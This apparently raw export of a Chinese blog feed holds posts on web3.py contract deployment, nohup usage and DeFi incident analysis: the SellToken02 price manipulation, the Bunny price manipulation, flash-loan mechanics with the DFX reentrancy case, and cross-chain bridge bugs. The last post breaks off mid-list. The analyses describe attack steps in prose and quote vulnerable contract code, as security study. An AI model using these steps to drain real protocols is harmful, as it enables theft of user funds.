    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-智能合约"><a href="#1-智能合约" class="headerlink" title="1. 智能合约"></a>1. 智能合约</h1><p>这里用以太坊公链进行说明，以太坊上支持的智能合约主要是由Solidity语言编写，后续介绍都以，以太坊的Goerli测试链为例，进行介绍。<br><strong>智能合约</strong> ：是指用特定语言编写，后将其部署到区块链上，实现特定功能的代码。<br>之前一直研究智能合约的漏洞，而并没有与实际测试链上智能合约进行交互，这次一项目用到这，对web3.py进行了学习。<br>现在主流智能合约的开发，一般都不太会用web.py，都有封装好的truffle框架，hardhat框架，以及Foundry等。<br>本文只是对完整web3开发的一个初步了解。</p>
<h1 id="2-测试链和节点数据"><a href="#2-测试链和节点数据" class="headerlink" title="2. 测试链和节点数据"></a>2. 测试链和节点数据</h1><p>这里我们用的以太坊的测试链Goerli，Sepolia也可以用，以及自己通过geth，ganache搭建的私链都可以来测试<br>先尝试着连接区块链：</p>
<ul>
<li>测试链的话，去infura上申请个节点，会给你个url，相当于可以通过这个节点访问测试链上数据</li>
<li>私链的话，直接连接服务器或本机的某个端口就行，一般是7545 or 8545<h1 id="3-web3-py的使用"><a href="#3-web3-py的使用" class="headerlink" title="3. web3.py的使用"></a>3. web3.py的使用</h1>首先安装web3<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure>
<h2 id="3-1-连接区块链"><a href="#3-1-连接区块链" class="headerlink" title="3.1 连接区块链"></a>3.1 连接区块链</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w3 = Web3(Web3.HTTPProvider(url))</span><br><span class="line"><span class="built_in">print</span>(w3.is_connected())  <span class="comment">##判断是否连接上</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2-部署合约"><a href="#3-2-部署合约" class="headerlink" title="3.2 部署合约"></a>3.2 部署合约</h2><h3 id="3-2-1-获取abi和bytecode"><a href="#3-2-1-获取abi和bytecode" class="headerlink" title="3.2.1 获取abi和bytecode:"></a>3.2.1 获取abi和bytecode:</h3>web3.py在部署合约之前需要通过对源码进行解析得到其abi和bytecode<br><strong>abi</strong>：abi主要包含的合约的函数调用信息，即函数参数，返回值，签名等信息<br><strong>bytecode</strong>：bytecode是指源码进行编译得到的二进制代码<br>python可以通过==solcx==库中的==compile_standard==函数进行合约解析，得到合约的abi和字节码，在创建合约，部署合约时会用到。<h3 id="3-2-2-部署合约："><a href="#3-2-2-部署合约：" class="headerlink" title="3.2.2 部署合约："></a>3.2.2 部署合约：</h3>部署合约则主要通过官方封装的标准函数来实现，web3.py，web3.js的相关函数与geth官方的函数很像。</li>
<li>构建部署合约这一交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(abi = abi, bytecode = bytecode)</span><br><span class="line">nonce = w3.eth.get_transaction_count(Goerli_address)</span><br><span class="line">transaction = Contract.constructor().build_transaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: Goerli_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
<li>签名发布该交易<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = Goerli_privateKey)   </span><br><span class="line"><span class="comment">##账户私钥对交易进行验证</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)    </span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="comment">##根据交易哈希获取交易凭证，可获取部署合约的地址</span></span><br></pre></td></tr></table></figure>
<h3 id="3-2-3-调用合约中的函数"><a href="#3-2-3-调用合约中的函数" class="headerlink" title="3.2.3 调用合约中的函数"></a>3.2.3 调用合约中的函数</h3>以太坊中调用函数主要是通过call的方式调用函数签名进行实现。<br>可见毕设之前总结的文章<a href="https://blog.csdn.net/m0_53689197/article/details/129721360?spm=1001.2014.3001.5502">solidity合约函数调用</a></li>
</ul>
<p>这里为了方便起见，我们用函数名直接对函数进行调用<br>这里以调用<strong>storeUserData</strong>这一函数为例，进行说明：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Contract = w3.eth.contract(address = contract_address, abi = abi) </span><br><span class="line">nonce = w3.eth.get_transaction_count(call_address)</span><br><span class="line">transaction = Contract.functions.storeUserData(dataHash).build_transaction(</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="string">&quot;gas&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">       <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">       <span class="string">&quot;from&quot;</span>: call_address,</span><br><span class="line">       <span class="string">&quot;nonce&quot;</span>: nonce </span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">## dataHash这里为storeUserData需要传入的参数</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key = addressKey)</span><br><span class="line"><span class="comment">##签名该函数调用的交易</span></span><br><span class="line">send_tx = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(send_tx)</span><br><span class="line"><span class="comment">## 根据交易哈希，获取交易凭证，后对交易凭证进行分析处理</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3-2-4-Event的监听"><a href="#3-2-4-Event的监听" class="headerlink" title="3.2.4 Event的监听"></a>3.2.4 Event的监听</h3><p>因为后续实现对函数抛出的event进行实时监听，上述代码中获得了函数调用交易的tx_receipt，即交易凭证，其中就包含了event的log信息。<br>代码如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logs = Contract.events.AccessRequested().process_receipt(tx_receipt)</span><br><span class="line"><span class="comment">## AccessRequested()为对应的事件event</span></span><br></pre></td></tr></table></figure><br>随后对logs进行处理，即可实现实时监听合约的event抛出了</p>
]]></content>
      <categories>
        <category>智能合约</category>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>nohup后台运行相关</title>
    <url>/2024/04/15/nohup%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-nohup和-amp"><a href="#1-nohup和-amp" class="headerlink" title="1. nohup和&amp;"></a>1. nohup和&amp;</h2><p>用途：ssh连接linux服务器的时候，终端可能会断开，如何让程序在服务器后台一直运行</p>
<ul>
<li>nohup：nohup运行指令，使程序可以忽略刮起继续运行</li>
<li>&amp;：让程序在后台运行，一般和nohup一起用</li>
</ul>
<p>nohup command &amp;</p>
<p>nohup：是让命令永久的执行下去，和用户终端没有关系，&amp;是命令后台运行的意思</p>
<h2 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2. 输出重定向"></a>2. 输出重定向</h2><p>命令在后台运行的时候，可以把输出重定向到某个文件中，相当于一个日志文件，记录运行过程中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup command &gt; output.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>输出的内容保存到output.file中</p>
<p>0 – stdin (standard input)，1 – stdout (standard output)，2 – stderr (standard error) ；<br>2&gt;&amp;1是将标准错误（2）重定向到标准输出（&amp;1），标准输出（&amp;1）再被重定向输入到out.file文件中。</p>
<h2 id="3-nohup后台相关"><a href="#3-nohup后台相关" class="headerlink" title="3.nohup后台相关"></a>3.nohup后台相关</h2><ol>
<li>jobs -l</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs -l</span><br><span class="line">//查看当前终端生效的nohup程序，其它终端的命令，利用ps</span><br></pre></td></tr></table></figure>
<ol>
<li>ps查看后台nohup</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux | grep &lt;test&gt;</span><br><span class="line">//查看后台运行的nohup，以及自己运行的程序</span><br></pre></td></tr></table></figure>
<ol>
<li>kill关闭对应nohup</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 &lt;进程号&gt;</span><br><span class="line">//关掉对应的进程</span><br><span class="line">netstat -ap | grep port</span><br><span class="line">//通过对应的端口，查看相应的进程</span><br><span class="line">netstat -nap | grep PID</span><br><span class="line">//通过相应的进城ID,查看其占用的端口</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>linux工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全--价格操纵攻击事件分析</title>
    <url>/2024/05/02/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-SellToken02攻击事件"><a href="#1-SellToken02攻击事件" class="headerlink" title="1. SellToken02攻击事件"></a>1. SellToken02攻击事件</h2><p>2023年5月13日，发生在BSC链上的价格操纵攻击</p>
<ul>
<li>攻击合约：<a href="https://bscscan.com/address/0x19ed7cd5f1d2bd02713131344d6890454d7c599f">bscscan.com</a></li>
<li>攻击交易地址：<a href="https://bscscan.com/tx/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></li>
<li>phalcon分析结果：<a href="https://app.blocksec.com/explorer/tx/bsc/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a">0x7d04e953dad4c880ad | Phalcon Explorer (blocksec.com)</a></li>
</ul>
<h3 id="（1）phalcon调用序列分析"><a href="#（1）phalcon调用序列分析" class="headerlink" title="（1）phalcon调用序列分析"></a>（1）phalcon调用序列分析</h3><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202405021243773.png" alt="image-20240502123755653"></p>
<ul>
<li>攻击者调用对应攻击合约的0x74ff2dff攻击函数，传入对应的参数</li>
<li>先通过DPPOracle调用对应的闪电贷，回调函数中继续调用闪电贷，并且接着调用，调用了三次闪电贷函数，分别在不同的地方借的，借的都是WBNB。</li>
<li>进入最后一个回调函数，看看干了些啥</li>
</ul>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202405021246470.png" alt="image-20240502124621471"></p>
<ul>
<li>看到攻击者先调用<code>PancakeRouter</code>的交换代币函数，将对应400个WBNB换成对应数量400多万的SellToken代币，并且将闪电贷剩下的WBNB全部转到自己的账上</li>
<li>Short、balanceOf等函数，查看对应的状态值，应该没啥问题</li>
<li>攻击者调用<code>SellToken: Router v2</code>的<code>ShortStart()</code>函数，用13.37个WBNB去short减少SellTokenrouter中Selltoken的数量，看一下<code>ShortStart()</code>函数的源码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function ShortStart(address coin,address addr,uint terrace)payable public &#123;</span><br><span class="line">    address bnbOrUsdt=mkt.getPair(coin);</span><br><span class="line">    require(terraces[terrace]!=address(0) &amp;&amp; tokenPrice[addr][coin] &gt; 0);</span><br><span class="line">    require(coin != address(0));</span><br><span class="line">    require(bnbOrUsdt == _WBNB || bnbOrUsdt==_USDT);</span><br><span class="line">    require(!getNewTokenPrice(addr,coin,bnbOrUsdt) &amp;&amp; block.timestamp &gt; tokenPriceTime[addr][coin]);</span><br><span class="line">    uint bnb=msg.value;</span><br><span class="line">    uint tos=getToken2Price(coin,bnbOrUsdt,mkt.balanceOf(coin))/10;</span><br><span class="line">    require(Short[addr][coin].bnb+bnb &lt;= tos);</span><br><span class="line">    Short[addr][coin].token=bnbOrUsdt;</span><br><span class="line">    Short[addr][coin].coin=coin;</span><br><span class="line">    Short[addr][coin].bnb+=bnb*98/100;</span><br><span class="line">    tokenPrice[addr][coin]=0;</span><br><span class="line">    uint newTokenValue=getTokenPrice(coin,bnbOrUsdt,bnb*98/100);</span><br><span class="line">    Short[addr][coin].tokenPrice+=newTokenValue;</span><br><span class="line">    Short[addr][coin].time=block.timestamp;</span><br><span class="line">    address[] memory add=mySells[addr].coin;</span><br><span class="line">    bool isCoin;</span><br><span class="line">    for(uint i=0;i&lt;add.length;i++)&#123;</span><br><span class="line">         if(add[i]==coin)&#123;</span><br><span class="line">           isCoin=true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isCoin)&#123;</span><br><span class="line">       mySells[addr].mnu++;</span><br><span class="line">       mySells[addr].coin.push(coin);</span><br><span class="line">    &#125;</span><br><span class="line">    sum+=bnb;</span><br><span class="line">    payable(mkt).transfer(bnb*97/100);</span><br><span class="line">    if(bnbOrUsdt ==_USDT)&#123;</span><br><span class="line">       uint usdts=IERC20(_USDT).balanceOf(address(mkt));</span><br><span class="line">       mkt.buy(_WBNB,_USDT,bnb*97/100);</span><br><span class="line">      if(IERC20(_USDT).balanceOf(address(mkt))&gt;usdts)&#123;</span><br><span class="line">         uint ut=IERC20(_USDT).balanceOf(address(mkt))-usdts;</span><br><span class="line">         mkt.buy(_USDT,coin,ut);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        mkt.buy(bnbOrUsdt,coin,bnb*97/100);</span><br><span class="line">    &#125;</span><br><span class="line">    payable (owner()).transfer(bnb*2/100);</span><br><span class="line">    payable (terraces[terrace]).transfer(bnb/100);</span><br><span class="line">&#125;</span><br><span class="line">//通过getToken2Price()和getTokenPrice()函数获得对应代币的价格，后面细看</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来攻击者调用Pancakeswap Router的swapExactETHForTokensSupportingFeeOnTransferTokens()函数去操纵SELLC Token的价格，这里攻击者用大量的SELLC去兑换WBNB，看一下对应的代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">        require(path.length &gt;= 2, &#x27;PancakeLibrary: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = new uint[](path.length);</span><br><span class="line">        amounts[0] = amountIn;</span><br><span class="line">        for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);</span><br><span class="line">            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset</span><br><span class="line">function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;</span><br><span class="line">        require(amountIn &gt; 0, &#x27;PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;PancakeLibrary: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">        uint amountInWithFee = amountIn.mul(9975);</span><br><span class="line">        uint numerator = amountInWithFee.mul(reserveOut);</span><br><span class="line">        uint denominator = reserveIn.mul(10000).add(amountInWithFee);</span><br><span class="line">        amountOut = numerator / denominator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里可以看到，直接通过自动做市商对应的价格攻击计算相应的代币价格，可以兑换更多的WBNB。</li>
</ul>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>价格操纵攻击再理解</title>
    <url>/2023/12/16/%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%86%8D%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文的主要参考是METATRUST的捕鲸船分享，链接如下：</p>
<p><a href="https://www.youtube.com/watch?v=czyajRIHYlg">MetaTrust价格操纵攻击分享</a></p>
<h2 id="价格操纵的来源："><a href="#价格操纵的来源：" class="headerlink" title="价格操纵的来源："></a>价格操纵的来源：</h2><p>区块链世界中，为保持所有节点的共识一致，区块链阉割了每个节点独立获取链外信息的能力</p>
<p>区块链想获取类似外界的价格信息，只有两种方式：</p>
<ul>
<li>通过实体类似Chainlink主动喂价，不断地将价格数据发布到链上</li>
<li>直接通过某个智能合约中存储的参数，如uniswap等</li>
</ul>
<p>举例：这是想获得的WETH价格，即为外部数据</p>
<p><code>getReserves()</code>请求ETH价格，金融模型计算返回对应的值</p>
<p>这里如果通过闪电贷，如果金融模型错误计算的话，计算出的WETH就很可能出现问题</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162145635.png" alt="image-20231216214431185"></p>
<h2 id="什么是价格操纵攻击："><a href="#什么是价格操纵攻击：" class="headerlink" title="什么是价格操纵攻击："></a>什么是价格操纵攻击：</h2><p>价格操纵攻击是指通过<code>操控市场的买卖行为（操控流动性池或地址余额）</code>，<code>人为地影响产品或资产价格</code>，以谋取不正当利益</p>
<p>价格操纵的四要素：</p>
<ul>
<li>市场力量的不对等：通过闪电贷行为拥有大量的资金</li>
<li>买卖行为的操纵：大额的代币兑换，破坏市场机制（市场的流动性）</li>
<li>恶意影响价格：资产价格计算错误（脆弱的询价机制）</li>
<li>谋取不正当利益：出现异常数量的奖励或抵押品</li>
</ul>
<h2 id="真实价格操纵攻击案例："><a href="#真实价格操纵攻击案例：" class="headerlink" title="真实价格操纵攻击案例："></a>真实价格操纵攻击案例：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162153491.png" alt="image-20231216215338496"></p>
<h3 id="正常流程："><a href="#正常流程：" class="headerlink" title="正常流程："></a>正常流程：</h3><ul>
<li>用户质押BNB和USDT，获得LP流动性证明；</li>
<li>随后调用getReward()函数兑换掉LP，获得收益</li>
<li>移除流动性过程中，会根据池子中BNB代币，兑换成Bunny代币</li>
</ul>
<h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3><p>分析可见<a href="https://mp.weixin.qq.com/s/O2j5OyUh2qJZSRhnMD5KTg">慢雾pancake攻击分析</a></p>
<ul>
<li><p>第一笔自己交易获得一定的LP流动性证明</p>
</li>
<li><p>用户通过闪电贷兑换了大量的BNB和USDT</p>
</li>
<li>第二笔交易闪电贷，向池子中添加大量流动性，同时调用getReward()函数</li>
<li>首先将LP转到WBNB-USDT池子中移除流动性，池子中有大量BNB和USDT</li>
<li>随后大量的BNB和USDT转化为WBNB-BUNNY流动性，WBNB池子中WBNB数量激增</li>
<li>随后根据得到的WBNB-BUNNY的LP数量，<code>valueOfAsset函数计算LP价值</code></li>
<li><code>问题就出在valueOfAsset进行LP价值计算的时候，通过WBNB-BUNNY池子中的WBNB实时数量计算</code>，导致单个LP价值显著增加</li>
</ul>
<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171136385.png" alt="image-20231217113643150"></p>
<p>getReserve()函数计算得到池中BNByue，后直接用以计算LP相对于BNB的价值</p>
<p>具体金融模型计算：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312162201816.png" alt="image-20231216220150156"></p>
<h2 id="如何避免价格操纵攻击："><a href="#如何避免价格操纵攻击：" class="headerlink" title="如何避免价格操纵攻击："></a>如何避免价格操纵攻击：</h2><p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312171137995.png" alt="image-20231217113754981"></p>
<p>避免使用脆弱的询价机制，主要有三种方式：</p>
<ul>
<li>通过EOA（Chainlink）这样的实体，不断地喂价</li>
<li>收集多个来源的价格，对不同来源的价格进行加权平均</li>
<li>对过去一段时间内的价格，进行加权平均（uniswap）</li>
</ul>
<blockquote>
<p>一个敏感操作的变量数据，一定不能依赖于用户易于操控的数据，不然容易产生危险。</p>
</blockquote>
<p>污点分析的方式进行漏洞检测</p>
]]></content>
      <categories>
        <category>Defi安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>Defi安全</tag>
      </tags>
  </entry>
  <entry>
    <title>闪电贷原理及安全事件分析</title>
    <url>/2023/12/17/%E9%97%AA%E7%94%B5%E8%B4%B7%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文主要参考有：</p>
<p><a href="[闪电贷原理及安全事件分析——被攻击项目的原因和防范措施 (youtube.com">捕鲸船的分享</a>](<a href="https://www.youtube.com/watch?v=_1dK61Qnv38">https://www.youtube.com/watch?v=_1dK61Qnv38</a>))</p>
<p><a href="[闪电贷技术详解-Part 3 | 登链社区 | 区块链技术社区 (learnblockchain.cn">SharkTeam系列文章—闪电贷</a>](<a href="https://learnblockchain.cn/article/4502#Aave">https://learnblockchain.cn/article/4502#Aave</a> 闪电贷优缺点))</p>
<h2 id="什么是区块链上的闪电贷："><a href="#什么是区块链上的闪电贷：" class="headerlink" title="什么是区块链上的闪电贷："></a>什么是区块链上的闪电贷：</h2><p><code>闪电贷：</code> 最初的目的是在区块链上实现，允许用户在不提供任何东西作为抵押的情况下进行借款。</p>
<p>如何让真正实现闪电贷这一功能，依靠区块链上交易的原子性，让闪电贷的借贷和偿还在同一交易中完成，如果没有完成相应的偿还，则回退整个交易；</p>
<p>为防止闪电贷在Defi中的滥用，每次闪电贷还款的时候需要支持贷款金额的贷款费用，如0.09%，否则也将回退整个交易。</p>
<p>Aave最初提出闪电贷的概念是为了想服务于金融业产品开发者群体，让更多的开发人员在无需资金的情况下，使用闪电贷创建再融资工具或套利工具，构建金融产品，降低开发门槛。（查了一圈找到的比较合理的答案）</p>
<p>但目前闪电贷被大量滥用与资产间套利。</p>
<h2 id="闪电贷具体实现示例："><a href="#闪电贷具体实现示例：" class="headerlink" title="闪电贷具体实现示例："></a>闪电贷具体实现示例：</h2><p>常见的闪电贷平台：<code>Uniswap、Aave、Compound、MakerDAO、dYdX</code>等</p>
<p>存在闪电贷和闪电兑的区别：需不需要偿还相同的资产。</p>
<p>现有的闪电贷大多都是乐观转账，在借贷函数的实现的，先将借贷的代币转给借贷者，随后回调借贷者的函数，借贷者进行他的操作，最后在借贷函数结束前，必须还清借贷金额以及相应的手续费，否则交易回退</p>
<h3 id="Aave-v2"><a href="#Aave-v2" class="headerlink" title="Aave_v2"></a>Aave_v2</h3><ul>
<li><p>检查闪电贷的代币数量，计算手续费，协议费等</p>
</li>
<li><p>进行乐观转账，将代币转到用户的地址中</p>
</li>
<li><p>回调用户的excuteOperation函数，用户自己来进行套利操作，aave_v1在函数的最后需要进行相应的还款，aave_v2不需要立刻还款，但需要向借贷合约进行相应的授权。</p>
</li>
<li><p>v1检查还款金额（合约借贷前余额+手续费），v2借贷合约调用safetransform函数自己进行相应的转账，实现对应的还款。</p>
<p>下图主要为aave_v1版本的实现</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181055482.png" alt="image.png"></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181054425.png" alt="image.png"></p>
</li>
</ul>
<h3 id="Uniswap-v2"><a href="#Uniswap-v2" class="headerlink" title="Uniswap_v2"></a>Uniswap_v2</h3><p>uniswap其也提供闪电贷的功能，在v2版本中其主要是通过swap函数实现闪电贷</p>
<p>闪电贷其检测是否还款的原理，是根据自动做市商AMM原理，进行k值检验</p>
<p>可以粗略的理解uniswap，其代币的pair对是满足</p>
<script type="math/tex; mode=display">
x_1*x_2 = k</script><p>最后的k值校验只要满足：</p>
<script type="math/tex; mode=display">
(balance^{'}_1-fee)*(balance^{'}_0-fee) \ge k</script><p>账户还款后的余额减去对应的交易费用，满足大于k即可。</p>
<p>从上式我们不难看出，在uniswap中还款，我们不一定需要还同一种资产，可以换相应pair对的资产也可。</p>
<ul>
<li>进行相关借款的检验</li>
<li>进行乐观转账</li>
<li>回调借贷者的uniswapV2call函数，进行相应的套利操作，并在函数的最后实现还款</li>
<li>k值校验，判断是否还款</li>
</ul>
<p>其闪电贷其余步骤，与aave相似，唯一不同的是，uniswap是将对应的还款在uniswapV2call函数中，直接转给相应的借贷合约</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107332.png" alt="image.png"></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181107303.png" alt="image.png"></p>
<h2 id="闪电贷的攻击类型"><a href="#闪电贷的攻击类型" class="headerlink" title="闪电贷的攻击类型"></a>闪电贷的攻击类型</h2><ul>
<li>利用闪电贷大的资金量操纵价格，一些项目中的询价机制存在漏洞，可见<a href="[价格操纵攻击再理解 | 来自门头沟学院的Emmanuel (emmanuelwh.github.io">价格操纵文章</a>](<a href="https://emmanuelwh.github.io/2023/12/16/价格操纵攻击再理解/">https://emmanuelwh.github.io/2023/12/16/价格操纵攻击再理解/</a>))</li>
<li>一些项目在抵押或其它过程中会产生瞬时奖励，利用闪电贷获得大额奖励</li>
<li>项目中存在其它逻辑漏洞，利用闪电贷大的资金量发大套利空间</li>
</ul>
<h2 id="DFX攻击事件分析"><a href="#DFX攻击事件分析" class="headerlink" title="DFX攻击事件分析"></a>DFX攻击事件分析</h2><p>漏洞的主要原因是主要有两个：</p>
<ul>
<li><p>闪电贷归还逻辑为闪电贷前后池子中金额的差值</p>
</li>
<li><p>但DFX合约的中并未对它的借贷方法和添加流动性方法进行重入限制。通俗来说，就是将借贷的钱抵押到同一个池子中，用户需要还款的闪电贷很少，但却有着大量的LP流动性证明</p>
</li>
</ul>
<p>攻击的主要步骤为：</p>
<ul>
<li>调用flash函数借贷大量的USDC和XIDR</li>
<li>后将借到的两种代币在同一个池子中进行抵押</li>
<li>此时闪电贷前后的池子差，远远小于攻击者借出的资金，攻击者归还很少的资金即可</li>
<li>但用户抵押的流动性还依然在它手中，移除流动性，获得大量的USDC和XIDR</li>
</ul>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312181125560.png" alt="image-20231218112539740"></p>
]]></content>
      <categories>
        <category>Defi安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>Defi安全</tag>
      </tags>
  </entry>
  <entry>
    <title>跨链桥安全事件总结分析</title>
    <url>/2023/12/16/%E8%B7%A8%E9%93%BE%E6%A1%A5%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="跨链桥事件总结分析"><a href="#跨链桥事件总结分析" class="headerlink" title="跨链桥事件总结分析"></a>跨链桥事件总结分析</h1><h2 id="Poly-Network-跨链桥事件"><a href="#Poly-Network-跨链桥事件" class="headerlink" title="Poly Network 跨链桥事件"></a>Poly Network 跨链桥事件</h2><p>Relayer的不完整检验</p>
<ul>
<li><p>源链上(Ontology)的relayer没有对上链的交易做语义校验，因此包含修改keeper恶意交易可以被打包到poly chain上</p>
</li>
<li><p>目标链上(以太坊)上的relayer虽然对交易做了校验，但是攻击者可以直接调用以太坊上的EthCrossChainManager合约最终调用EthCrossChainData合约完成签名修改</p>
</li>
<li><p>攻击者精心够着了能导致hash冲突的函数签名，从而调用<code>putCurEpochConPubKeyBytes</code>完成对签名的修改 </p>
</li>
</ul>
<p>见攻击步骤的具体分析</p>
<p><a href="https://zhuanlan.zhihu.com/p/398941126">Poly Network事件分析</a></p>
<h2 id="Polygon-Plasma-Bridge漏洞"><a href="#Polygon-Plasma-Bridge漏洞" class="headerlink" title="Polygon Plasma Bridge漏洞"></a>Polygon Plasma Bridge漏洞</h2><p>外部验证+乐观验证 该漏洞可以伪造铸币证明，导致双花攻击</p>
<p>完整的一次Withdraw交易过程如下：</p>
<ul>
<li>用户在Polygon上发起Withdraw交易，该交易会burn掉用户在Polygon的代币；</li>
<li>经过一个检查点间隔（大约30分钟），等待该withdraw交易被包含到检查点中；</li>
